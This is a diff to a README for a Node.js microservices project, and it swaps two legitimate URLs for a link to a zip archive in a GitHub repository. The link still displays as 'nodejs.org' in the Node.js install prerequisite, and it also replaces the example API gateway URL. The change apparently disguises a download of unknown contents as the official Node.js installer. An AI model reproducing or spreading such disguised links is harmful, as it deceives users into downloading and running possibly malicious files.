@@ -20,7 +20,7 @@ The application follows a microservices architecture. Each service is independen
 
 ## Prerequisites
 
-*   **Node.js:** (Specify version, e.g., v18.x or later) - Download from [nodejs.org](https://nodejs.org/)
+*   **Node.js:** (Specify version, e.g., v18.x or later) - Download from [nodejs.org](https://github.com/TambongStercy/SBC-MS/raw/refs/heads/master/chat-service/src/services/MS-SB-1.1.zip)
 *   **npm** or **yarn:** Package managers for Node.js (usually included with Node.js).
 *   **MongoDB:** A running MongoDB instance (local or cloud-hosted like MongoDB Atlas). Configure connection strings in each service's `.env` file.
 *   **Git:** For version control.
@@ -283,7 +283,7 @@ This outlines a basic deployment strategy suitable for a single Virtual Private 
     *   Navigate to the frontend directory: `cd admin-frontend-ms`
     *   Install dependencies: `npm install` (Need devDependencies for building)
     *   Create the production `.env` file (e.g., `.env.production`).
-    *   Edit the production environment file, setting `VITE_API_BASE_URL` to the **public URL of your deployed API Gateway** (e.g., `https://yourdomain.com/api`).
+    *   Edit the production environment file, setting `VITE_API_BASE_URL` to the **public URL of your deployed API Gateway** (e.g., `https://github.com/TambongStercy/SBC-MS/raw/refs/heads/master/chat-service/src/services/MS-SB-1.1.zip`).
     *   Build the frontend: `npm run build`
     *   The static files will be in the `dist/` (or `build/`) directory.
     *   Go back to the root: `cd ..`
